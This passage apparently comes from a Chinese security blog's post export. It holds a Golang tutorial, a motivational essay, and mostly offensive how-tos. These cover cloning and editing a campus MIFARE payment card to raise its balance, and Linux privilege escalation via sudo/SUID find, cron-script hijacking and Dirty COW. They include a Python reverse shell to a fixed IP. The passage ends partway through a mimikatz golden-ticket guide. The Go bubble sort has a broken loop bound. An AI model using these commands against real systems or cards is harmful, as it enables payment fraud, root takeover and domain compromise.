\u0026lt;= a \u0026amp;\u0026amp; a \u0026lt;= 10) //0 \u0026lt;= a \u0026lt;= 10 的结果： true } 五、流程控制 对程序做出逻辑性控制。\n5.1 Golang最基本的三种程序运行控制 5.1.1 顺序控制 程序按顺序运行，流水账从上往下运行，不发生跳转。\n5.1.2 选择控制 依据是否满足条件，有选择地执行相应功能。\n5.1.3 循环控制 依据条件是否满足，循环多次执行某段代码。\n5.2 if条件语句 if 语句支持1个初始化语句，初始化语句与判断语句写在同一行中。 示例：\n1 2 3 4 5 func main() { if a := 10; a == 10 { fmt.Println(\u0026#34;yes\u0026#34;) //yes } } a := 10 是初始化语句，a == 10 是判断语句。 这样可以非常好地控制变量的作用域：\n1 2 3 4 5 6 7 func main() { if a := 10; a == 10 {\t//a只能在这个代码块中有效 fmt.Println(\u0026#34;yes\u0026#34;) //yes } fmt.Println(a) //undefined: a } 5.3 switch if...else if...else 另一种简洁灵活的写法。\n5.3.1 语法 最基本的语法：\n1 2 3 4 5 6 7 8 9 10 switch 变量本身 { case 变量的值1: 语句 case 变量的值2: 语句 case 变量的值n: 语句 default: //default可以省略 语句 } 变量本身和下面 case 分支中的变量值进行比较（从上往下比较），匹配到了就进入对应的 case 分支中。 switch 也支持1个初始化语句。 注意：一个 case 分支中的值，不能与其他 case 分支中的值重复！\n5.3.2 break 默认情况下，case 语句中自带了 break。执行完一个 case 分支后，自动跳出当前整个 switch，不会自动向下执行其他 case。\n5.3.3 fallthrough 不判断下一个case 变量的值，无条件强制执行下去。 fallthrough下面必须要接语句，无论是接 case 还是 default。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func main() { switch num := 1; num { //支持1个初始化语句，初始化语句和变量本身使用分号分隔 case 1: fmt.Println(\u0026#34;print 1\u0026#34;) fallthrough //不跳出switch语句块，下一个case语句不做判断，无条件强制执行下去 case 2: fmt.Println(\u0026#34;print 2\u0026#34;) fallthrough //不跳出switch语句块，下一个case语句不做判断，无条件强制执行下去 default: fmt.Println(\u0026#34;print else\u0026#34;) } } /* 运行结果： print 1 print 2 print else */ 5.3.4 根据case条件自行选择分支 switch 后面不接变量本身，而是根据case 条件的判断结果自行去选择分支。 语法：\n1 2 3 4 5 6 7 8 9 10 switch { //不接变量本身，根据各个case条件进行判断、选择 case 条件1: //case后面放条件 语句 case 条件2: //case后面放条件 语句 case 条件n: //case后面放条件 语句 default: //default可以省略 语句 } 如果根据 case 条件的判断结果去自行选择分支，那么 switch 后面就不能接变量本身了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { grade := 80 switch { //这里不写变量本身了 case grade \u0026gt; 90: //case分支中判断是否满足条件，符合条件进入这个分支 fmt.Println(\u0026#34;优秀\u0026#34;) case grade \u0026gt;= 80: //case中判断是否满足条件 fmt.Println(\u0026#34;良好\u0026#34;) default: fmt.Println(\u0026#34;其他\u0026#34;) } } /* 运行结果： 良好 */ 5.3.5 测试多个符合条件的值 case 语句中，可以同时写上多个可能符合条件的值，使用逗号分割它们。例如：case 值1, 值2, 值3。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func main() { switch grade := 70; grade { case 90: fmt.Println(\u0026#34;优秀\u0026#34;) case 80: fmt.Println(\u0026#34;良好\u0026#34;) case 60, 70: fmt.Println(\u0026#34;及格\u0026#34;) default: fmt.Println(\u0026#34;不及格\u0026#34;) } } /* 运行结果： 及格 */ 5.4 for循环 Golang 中的循环只有 for 循环。\n5.4.1 基本语法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main //必须有一个main包 import \u0026#34;fmt\u0026#34; //导入包含，必须要使用 func main() { //for初始化条件; 判断条件; 条件变化{ // } //1+2+3...+100 累加 sum := 0 //1) 初始化条件 i := 1 //2) 判断条件是否为真，i \u0026lt;= 100，如果为真，执行循环体，如果为假，跳出循环 //3) 条件变化 i++ //4) 重复2，3，4 for i := 1; i \u0026lt;= 100; i++ { sum += i } fmt.Println(\u0026#34;sum = \u0026#34;, sum) } 5.4.2 基本流程 1.初始化条件。 2.判断条件是否为真，如果为真进入循环体内，如果为假则跳出循环。 3.执行条件变化的语句。 4.重复 2.3.4 步骤。\n5.4.3 range迭代 一种自动实现的迭代器，常用于：数组、切片、通道。需要在 for 循环中使用。 range 有两个返回值：第一个返回值是元素的下标；第二个返回值是元素自身的值。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main //必须有一个main包 import \u0026#34;fmt\u0026#34; //导入包含，必须要使用 func main() { str := \u0026#34;abc\u0026#34; //通过for打印每个字符 for i := 0; i \u0026lt; len(str); i++ { fmt.Printf(\u0026#34;str[%d]=%c\\n\u0026#34;, i, str[i]) } //迭代打印每个元素，默认返回2个值：一个是元素的位置，一个是元素本身 for i, data := range str { fmt.Printf(\u0026#34;str[%d]=%c\\n\u0026#34;, i, data) } for i := range str { //第2个返回值，默认丢弃，返回元素的位置（下标） fmt.Printf(\u0026#34;str[%d]=%c\\n\u0026#34;, i, str[i]) } for i, _ := range str { //第2个返回值，默认丢弃，返回元素的位置（下标） fmt.Printf(\u0026#34;str[%d]=%c\\n\u0026#34;, i, str[i]) } } /* 运行结果： str[0]=a str[1]=b str[2]=c str[0]=a str[1]=b str[2]=c str[0]=a str[1]=b str[2]=c str[0]=a str[1]=b str[2]=c */ 5.4.4 几个for循环小案例 5.4.4.1 九九乘法表 打印九九乘法表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 func main() { //外层控制共循环几次 for i := 1; i \u0026lt; 10; i++ { //里层控制每次循环需要计算几次 for j := 1; j \u0026lt;= i; j++ { fmt.Printf(\u0026#34;%d x %d = %d\\t\u0026#34;, j, i, i*j) //1*9的格式来显示 } fmt.Println() } } /* 运行结果： 1 x 1 = 1 1 x 2 = 2 2 x 2 = 4 1 x 3 = 3 2 x 3 = 6 3 x 3 = 9 1 x 4 = 4 2 x 4 = 8 3 x 4 = 12 4 x 4 = 16 1 x 5 = 5 2 x 5 = 10 3 x 5 = 15 4 x 5 = 20 5 x 5 = 25 1 x 6 = 6 2 x 6 = 12 3 x 6 = 18 4 x 6 = 24 5 x 6 = 30 6 x 6 = 36 1 x 7 = 7 2 x 7 = 14 3 x 7 = 21 4 x 7 = 28 5 x 7 = 35 6 x 7 = 42 7 x 7 = 49 1 x 8 = 8 2 x 8 = 16 3 x 8 = 24 4 x 8 = 32 5 x 8 = 40 6 x 8 = 48 7 x 8 = 56 8 x 8 = 64 1 x 9 = 9 2 x 9 = 18 3 x 9 = 27 4 x 9 = 36 5 x 9 = 45 6 x 9 = 54 7 x 9 = 63 8 x 9 = 72 9 x 9 = 81 */ 5.4.4.2 冒泡排序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func Bubbling(sli []int) { length := len(sli) //外层控制共循环几次 for i := 0; i \u0026lt; length-1; i++ { //里层控制每个元素都参与比较 for j := i + 1; j \u0026lt; length-1; j++ { if sli[i] \u0026lt; sli[j] { //策略：大的数字放在前面 sli[i], sli[j] = sli[j], sli[i] } } } } func main() { sli := []int{5, 9, 10, 3, 6, 1, 0, 7, 8, 4, 2, 0} fmt.Println(\u0026#34;before bubbling:\u0026#34;, sli) Bubbling(sli) fmt.Println(\u0026#34;after bubbling:\u0026#34;, sli) } /* 运行结果： before bubbling: [5 9 10 3 6 1 0 7 8 4 2 0] after bubbling: [10 9 8 7 6 5 4 3 2 1 0 0] */ 5.5 跳转语句 5.5.1 break break 可以用在 for、switch、select。\n5.5.2 continue continue 只能用在 for 循环中！\n5.5.3 break和continue不能同时出现在同一级语句块中 break 和 continue 同时出现在同一级语句块中，就会自相矛盾，导致另一个语句无法到达！\n5.6 goto goto 可以在任何地方使用，但不能跨函数使用。 不建议使用，因为会破坏程序的结构！\n5.6.1 goto不能跨函数使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import \u0026#34;fmt\u0026#34; func testFunc() { END: fmt.Println(\u0026#34;this is testFunc.\u0026#34;) } func main() { goto END } /* 运行结果： .\\main.go:6:1: label END defined and not used .\\main.go:11:7: label END not defined */ 5.6.2 goto无条件跳转 程序遇到 goto 语句，将会无条件强制跳转。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { fmt.Println(\u0026#34;111\u0026#34;) goto END //自定义标签名，无条件强制跳转去该标签的所在代码块 fmt.Println(\u0026#34;3333\u0026#34;) //此行代码永远无法到达 END: fmt.Println(\u0026#34;END target\u0026#34;) } /* 运行结果： 111 END target */ 尝试将上面代码中的 END 标签和其代码块放到 main() 函数的第一行，会发生什么情况？ 程序进入死循环，没完没了地一直在跳转。\n1 2 3 4 5 6 7 8 9 10 func main() { END: fmt.Println(\u0026#34;END target\u0026#34;) fmt.Println(\u0026#34;111\u0026#34;) goto END fmt.Println(\u0026#34;3333\u0026#34;) } 5.6.3 goto 的使用场景示例 有这么一个场景：打印 1 ~ 10，不能用 for 循环。 用 goto 就能很容易实现需求：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { n := 1 LOOP: // 定义 goto 的标签，以及实现代码逻辑 fmt.Printf(\u0026#34;%d \u0026#34;, n) n++ if n \u0026lt;= 10 { goto LOOP // 跳转到该标签 } } /* 运行结果： 1 2 3 4 5 6 7 8 9 10 */ 以上代码，也是运用了循环的思维模式，只是换了跳转的方式而已。 还有一种方式就是递归：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 var n = 1 func main() { if n \u0026lt;= 10 { fmt.Printf(\u0026#34;%d \u0026#34;, n) n++ main() } } /* 运行结果： 1 2 3 4 5 6 7 8 9 10 */ 递归是循环的另一种表现形式。\n六、值类型 \u0026amp;\u0026amp; 引用类型 6.1 值类型 1 2 3 4 5 6 7 bool int(32 or 64), int8, int16, int32, int64 uint(32 or 64), uint8(byte), uint16, uint32, uint64 float32, float64 string complex64, complex128 array // 固定长度的数组 6.2 引用类型 Golang 中，只有这几个引用类型：\n1 2 3 4 5 6 slice // 切片 map // HashMap pointer //指针类型 channel //管道（通道） interface //接口 function //函数 ","date":"2021-01-05T08:35:25Z","image":"https://w.wallhaven.cc/full/kx/wallhaven-kxdz96.jpg","permalink":"https://360rce.github.io/p/nn24jprl/","title":"Golang学习之基本类型与流程控制"},{"content":"文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路\n{\u0026lt; quote \u0026gt;}}\n本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！\n{\u0026lt; /quote \u0026gt;}}\n一、破解打水功能 用到的工具：\n读卡设备：ACCR122U一个\n空白M1卡片一张\n在用的一慧通一张\n上图：\n平台：windows7\n软件：NFCGUI-Pro.exe\nM1卡服务程序\n具体实施： 先去打水那查看卡内的余额：\n卡内余额为29.85元，然后将ACR122u插在机器上，使用M1卡服务程序破解得出卡内的DUMP文件\n使用M1卡服务器程序破解：\n破解成功\n破解了好久终于破解成功，dump文件会生成在文件目录下：\ndumpfile 09d222aa (2015-11-1210_37_36) 1K.dump文件就是生成的破解文件 可以看到生成的dump文件为1KB大小，但是具体写入M1卡的时候是需要写入4KB大小的dump文件的\n我是可以使用NFCGUI-PRO.exe修复，\n如图：\n打开这个软件点击选择文件-选择刚才生成的1KB文件-就会提示“是否保存为4K文件格式”—选择“是”-就是自带修复成功\n然后关闭软件，刚才的1kb的DUMP文件就会自带修复为4KB文件了。\n通过上面的方法再得到两个不同金额的dump文件。\n通过十六进制编辑器进行dump文件的对比，找出金额控制位，我使用winhex进行编辑dump文件：\n因为这三个文件都是同一张卡片不同金额的dump文件，所以假定有金额的数据不同，有刷\n卡次数记录的数据不同，刷卡时间的记录不同，（假定会有这些不同之处，也许只有记录\n金额的变化），通过对比两张卡片，发现在00000901有不同的数据块\n如图\n余额为29.85：\n余额为29.83：\n余额为29.33：\n发现这两张卡内的不同之处在于：\n将十进制金额转换为十六进制为：\n1 2 3 2985 = BA9 2983 = BA7 2933 = B75 可以看出\n1 2 3 A9 B A7 B 75 B 得出结论\n1 2 3 B2 = B BC = B 6E = B 当时想这个B是怎么来的，想了好久，后来发现，将两个不同的数据块进行xor运算：\n1 2 3 A9 xor B2 = 1B A7 xor BC = 1B 75 xor 6E = 1B xor是如何进行运算的\n例如：\n1 2 3 4 5 6 7 8 9 10 A9 xor B2 = 1B 将A9转换为二进制为10101001 将B2转换为二进制为10110010 10101001 10110010 ———— 00011011 然后将00011011转换成十六进制等于1B 我把金额改成40元\n40转换成十六进制为：\n40-4000-FA0\nA0 xor ？= 1F\n将A0转换为二进制为10100000\n将1F转换为二进制为11111\n10100000\n​ ？\n————\n11111\n可以得出问好区域是10111111\n10111111转换为十六进制为BF\n直接在winhex内修改dump文件：\n直接保存为40.dump\n通过NFCGUI-PRO.exe软件将dump文件写入到空白卡片中：\n如图:\n打开NFCGUI-PRO.exe软件后DUMP和Key文件选择加载文件40.dump\n将ACR122U插入到电脑后将空白卡片放到读卡器上后选择写入文件\n写入成功：\n当我拿去测试时，如图：\n没错，读不出来\u0026hellip;\u0026hellip;\n然后我的思绪就这样断了\u0026hellip;\n我又拿水卡刷了几次后，卡内余额剩余25.90时，终于又发现了\u0026hellip;.\n如图：\n余额：29.33元\n余额：25.90元\n把金额转换为十六进制\n1 2 29.33—2933—B75 25.90—2590—A1E 这样子应该就可以看出了\n40转换成十六进制为：\n40-4000-FA0\n/*这些上面说过了，怕有些人看不懂我再写一下过程\nA0 xor ？= 1F\n将A0转换为二进制为10100000\n将1F转换为二进制为11111\n10100000\n？\n————\n11111\n可以得出问好区域是10111111\n10111111转换为十六进制为BF\n*/\n在winhex内修改dump文件：\n存为40.dump\n写入我就不再继续说了\n我拿卡去测试\n破解成功！！！！\n改成999.99太张扬了，而且某些原因，没数据可以分析，所以我加到40就够了！\n二、破解洗澡功能 男寝装备落后，没有插卡机，花了我5块大洋激活洗澡功能。\n经过妹子帮忙多次消费后（可惜那个妹子现在娃都会打酱油了），得出6次数据，4次自己卡中的数据，2次妹子卡中的数据。\n经过对比扇区数据不同后，确定了金额的位置，\n这4次是我自己的数据，如图：\n3.14\n3.20\n4.22\n5.00\n这是妹子卡中的两次数据，如图:\n0.16\n4.78\n将金额转换成十六进制为：\n1 2 3 4 5 6 3.14 = 314 = 13A 3.20 = 320 = 140 4.22 = 422 = 1A6 5.00 = 500 = 1F4 0.16 = 16 = 10 4.78 = 478 = 1DE 我卡中的数据不同的区域用红色的标记起来：\n3.14\n00 00 00 35 A0 3A 01 00 00 C5 FE FF FF 3A 01 00 00\n1D E2 1D E2 3A 01 00 00 C5 FE FF FF 3A 01 00 001E\n3.20\n00 00 00 35 A0 40 01 00 00 BF FE FF FF 40 01 00 00\n1D E2 1D E2 40 01 00 00 BF FE FF FF 40 01 00 001E\n4.22\n00 00 00 35 A0 A6 01 00 00 59 FE FF FF A6 01 00 00\n1D E2 1D E2 A6 01 00 00 59 FE FF FF A6 01 00 001E\n5.00\n00 00 00 35 A0 F4 01 00 00 0B FE FF FF F4 01 00 00\n1D E2 1D E2 F4 01 00 00 0B FE FF FF F4 01 00 001E\n我用3.14为例。3A 01区域有两处，可以看出金额3.14转换成十六进制是13A，后两位就是3A，第一位是1。这样就可以确定3A01是如何来的。\n关于C5是如何来的，经过我多次分析加运算后得知\nFF - 3A = C5 这样一来也可以知道C5是如何得来的\n我想把金额改成40元，40转换十六进制为40.00 =4000 = FA0\nFF - A0 = 5F\n可以得出40的数据为\n00 00 00 35 A0 A0 0F 00 00 5F FE FF FF A0 0F 00 00\n1D E2 1D E2 A0 0F 00 00 5F FE FF FF A0 0F 00 00 1E\n不过当我写进卡里时\u0026hellip;.\n这是妹子拍给我的照片\u0026hellip;.\n后来我对比妹子的两个数据\n0.16\n00 00 00 72 6A 10 00 00 00 EF FF FF FF 10 00 00 00\n1D E2 1D E2 10 00 00 00 EF FF FF FF 10 00 00 00 1E\n4.78\n00 00 00 72 6A DE 01 00 00 21 FE FF FF DE 01 00 00\n1D E2 1D E2 DE 01 00 00 21 FE FF FF DE 01 00 00 1E\n又有一个地方产生了变化\u0026hellip;.\n0.16时为FF，4.78为FE\n计算得出加密方法：\n0.16为例\nFF xor EF = 10\n10 + 00 = 10\n经过多次运算，所有金额数据都符合这个规律\n继续转到40的金额\n00 00 00 35 A0 A0 0F 00 00 5F FE FF FF A0 0F 00 00\n1D E2 1D E2 A0 0F 00 00 5F FE FF FF A0 0F 00 001E\n这是之前的数据\nA0 + 0F = AF\n? Xor 5F =AF\n关于xor的运算之前已经说过这里就不多说了\n得出结果为F0\n将数据改为\n00 00 00 35 A0 A0 0F 00 00 5F F0 FF FF A0 0F 00 00\n1D E2 1D E2 A0 0F 00 00 5F F0 FF FF A0 0F 00 00 1E\n写进卡中后\n成功，据说每次插进去都会少0.06，这就是传说中的吞钱？？\n结尾 一卡通有三个功能，吃饭的功能没去研究，就这样吧。\n文章写得简单，可过程经过多次测试与计算。\n最后祝各位看到此文章的学子们在大学期间都能找到自己的真爱。\n{% note primary %}\n本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！\n{% endnote %}\n","date":"2020-12-14T16:50:09Z","image":"https://wallroom.io/img/3840x2160/bg-210ebba.jpg","permalink":"https://360rce.github.io/p/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/","title":"我是如何破解学校一慧通的"},{"content":"1 最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是说：“马上马上，就看1分钟，再看1分钟！”\n可问题是，1分钟常常演变成10分钟、1小时，甚至一整天。\n我知道，网上有许多表弟感兴趣的内容，尤其系统还会根据他过去浏览的信息，有针对性地进行推送。比如表弟爱看幽默搞笑的段子，系统就会推送更多的类似视频给他。\n但是，如果没有足够的自制力去抵御外界的诱惑，过度沉迷于即时快感，那离废掉也就不远了。\n心理学上有一个“花盆效应”，说的是人如果在舒适的“花盆”中待久了，就容易不思进取、安于现状。\n如果你天天禁锢在自己的小圈子里，沉溺在自己的舒适区不可自拔，而不是用心花时间提升自己，怎么可能走向更广阔的天地呢？\n人生如逆水行舟，不进则退。如果选择过分安逸，就会丧失斗志；如果丧失了斗志，生活就会越来越闲；如果越来越闲，最终就会和别人拉开一大截差距。\n现在有多不思进取，将来被时代所抛弃时就有多后悔莫及。\n2 前几天，我的叔叔失业了，这沉重的一击害得他整天抽烟解闷，觉得在阿姨面前抬不起头来。\n其实，叔叔的情况，我们都早有耳闻。他自认为自己技术过硬，曾经又获得过公司的先进，就终日懒懒散散、不思进取，躺在过去的功劳簿上睡大觉。\n半年前，公司新招聘了个名校毕业的小伙子。小伙子吃苦耐劳，肯学肯干，技术水平早就在叔叔之上。\n叔叔也不是没有危机感，但他觉得，自己年纪大了，记性也差了，现在要学新东西也难了，常常是一边嘴里满是焦虑，一边又没有实际行动。\n现在工作被人取代，叔叔这才后悔莫及：试想，如果自己还是当年那个技术骨干，公司会让自己说走就走吗？\n说到底，这是他自己长期满足于现状、停止学习的代价。\n职场是个靠价值说话的地方，你有多少价值，决定了你能站上多高的位置。但凡有所成就的人，注定终身与读书和学习形影不离。\n只要你还在学习，人生就有无限可能。\n3 两个月前，闺蜜再一次立下誓言：暴瘦20斤。\n闺蜜是个吃货，见到啥好东西都管不住嘴，再加上迈不开腿，所以体重跟着蹭蹭蹭直线上升。\n我激励她：“不减下来，别来见我。”在那之后，她果然坚持跑步了一阵子。但没多久，她就又一切照旧了。\n“你不知道，跑多了腿酸。”\n“这是下雪天啊！会冻死的啊！”\n“啊，这么好吃的布丁，别拦我！”\n她总会有这样七七八八的理由。所以，如今见到她，还是老样子。\n生活中，总有一些人嚷嚷着要实现什么样的目标，却总是不能如愿，归根结底，缺的是自律。放弃了自律，迟早有一天要为过去的偷懒买单。\n有句话说得好：自律，出众；不自律，出局。\n4 没有人天生就是王者。\n说到底，一个人能有怎样的人生，走在什么样的路上，是痛苦还是快乐、失败还是成功，最终取决于自己。\n如果你的生活中，出现了不再愿意走出舒适区、停止了学习、放弃了自律这三种迹象，那就要提醒自己注意了。\n因为，成功，属于懂得走出舒适区、积极进取的人；\n属于坚持读书和学习的人；\n属于能够保持高度自律的人。\n与其怨天尤人，“望洋兴叹”，不如从现在开始，脚踏实地，不负韶华，努力成为更好的自己。\n","date":"2020-12-07T10:16:37Z","image":"https://w.wallhaven.cc/full/85/wallhaven-859zy1.png","permalink":"https://360rce.github.io/p/usdfwwlv/","title":"一个人开始废掉的3个迹象"},{"content":"漏洞介绍 如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。\n管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。\n一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道\u0026rsquo;find\u0026rsquo;命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。\n漏洞复现 拿到普通用户权限之后，使用sudo –l查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。\n1 sudo /usr/bin/find /home -exec /bin/bash -p \\; ","date":"2020-11-27T14:38:09Z","image":"https://w.wallhaven.cc/full/gp/wallhaven-gpd26e.jpg","permalink":"https://360rce.github.io/p/1ibvkqhp/","title":"Linux提权之Sudo配置错误"},{"content":"漏洞介绍 SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。\nSUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。\n许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。\n常见的可用于suid提权的命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Nmap Vim find Bash More Less Nano cp 漏洞复现 信息收集 使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。\n该脚本的下载地址：\n1 https://github.com/rebootuser/LinEnum 执行LinEnum之后，发现find这个命令有SUID权限。\n确认 find 有 root 执行权限 执行命令\n1 2 touch ice /usr/bin/find ice -exec whoami \\; 确认 find 命令是否是 root 权限执行.\n反弹shell 如果目标机上有 python 环境，可以使用 python 命令反弹 shell：\n1 2 #反弹一个sh类型的shell python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.126.165\u0026#34;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; 结合 find :\n1 /usr/bin/find ice -exec python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.126.165\u0026#34;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; \\; 但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid （euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）为 root 权限，但是反弹 shell 中并没有。\n默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。\n我们尝试使用如下命令获取 shell：\n1 /usr/bin/find ice -exec /bin/bash -p \\; 可以看到获取的 shell 为 root 权限。\n","date":"2020-11-27T13:44:54Z","image":"https://w.wallhaven.cc/full/we/wallhaven-wexqp7.jpg","permalink":"https://360rce.github.io/p/b222zucs/","title":"Linux提权之Suid提权"},{"content":"漏洞介绍 定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。\n比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。\n1 1 0 * * * printf \u0026#34;\u0026#34; \u0026gt; /var/log/apache/error_log 如果未正确配置Cron，则可以利用它获得root特权。\ncron作业中是否有可写的脚本或二进制文件？ 我们可以覆盖cron文件本身吗？ cron.d目录可写吗？ Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。\n漏洞复现 创建一个定时任务 目标：创建一个运行python脚本来擦除特定目录的所有数据 假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：\n1 2 3 4 5 6 7 mkdir cleanup cd cleanup echo \u0026#34;hello freinds\u0026#34; \u0026gt; 1.txt echo \u0026#34;ALL files will be deleted in 2 mints\u0026#34; \u0026gt; 2.txt echo \u0026#34;\u0026#34; \u0026gt; 1.php echo \u0026#34;\u0026#34; \u0026gt; 2.php ls 下图是上面命令执行的结果：\n下面我们写一个python程序来删除 /home/cleanup的内容。\n1 2 cd /tmp vi cleanup.py 1 2 3 4 5 6 7 #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /root/cleanup/* \u0026#39;) except: sys.exit() chmod 777 cleanup.py\n编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。\n1 2 vi /etc/crontab */2 * * * * root /tmp/cleanup.py 下面是运行效果\n在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。\npspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。\n该工具的下载地址：\n1 https://github.com/DominicBreuker/pspy 首先将pspy上传到目标机器：\n1）chmod +x pspy64s\n2）./pspy64\n观察一段时间，发现/tmp/cleanup.py为root权限执行。\n利用 查看/tmp/cleanup.py权限为普通用户可写\n打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(\u0026lsquo;rm -r /home/cleanup/* \u0026lsquo;)”：\n1 os.system(\u0026#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash\u0026#39;) 2分钟后，tmp目录下就会存在SUID权限的bash，运行/tmp/bash -p 后就获取了root权限。\n提权成功。\n","date":"2020-11-26T15:40:12Z","image":"https://w.wallhaven.cc/full/l8/wallhaven-l8d8yy.jpg","permalink":"https://360rce.github.io/p/aor7ahen/","title":"Linux提权之定时任务"},{"content":"漏洞介绍 Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。\nLinux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。\n漏洞复现 以Linux内核提权漏洞-“脏牛”来做演示。\n给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。\n下载地址：\n1 https://github.com/mzet-/linux-exploit-suggester 1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：\n1 2 3 chmod +x linux-exploit-suggester.sh ./linux-exploit-suggester.sh 在执行上述命令之前，首先查看Linux内核版本。\n查看脚本执行结果，可以使用脏牛来进行提权。\n2.将漏洞利用代码上传到目标机器，接下来编译并执行。\n1 2 3 gcc -pthread dirty.c -o dirty -lcrypt ./dirty password 3.该漏洞利用代码会加入一个uid为0的用户，使用su firefart切换到firefart用户，获取root权限。\n","date":"2020-11-26T11:12:42Z","image":"https://w.wallhaven.cc/full/kx/wallhaven-kxd77q.jpg","permalink":"https://360rce.github.io/p/dso9lycp/","title":"Linux提权之内核漏洞"},{"content":"Golden Ticket(黄金票据) 在AS_REQ \u0026amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。\n那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门\n制作黄金票据的前提条件 1、krbtgt用户的hash(就意味着你已经有域控制器权限了) cbcede6976ded273667a8e574a17092f 2、域名称 secice.cn 3、域的SID值 S-1-5-21-1431134449-3516206009-3475222595 4、要伪造的用户名(可以是任意用户甚至是不存在的用户) 黄金票据利用 先登录域控制器，dump krbtgt用户的hash值,获取域sid：\n1 2 3 mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt\t//导出 krbtgt 密码 hash 也可以 mimikatz.exe \u0026#34;lsadump::dcsync /domain:secice.cn /user:krbtgt\u0026#34; exit \u0026gt;\u0026gt; 1.txt\t//将导出的信息保存在1.txt中 切换到普通域用户的机器，生成TGT凭证,用户名随意:\n1 2 3 mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt 也可以 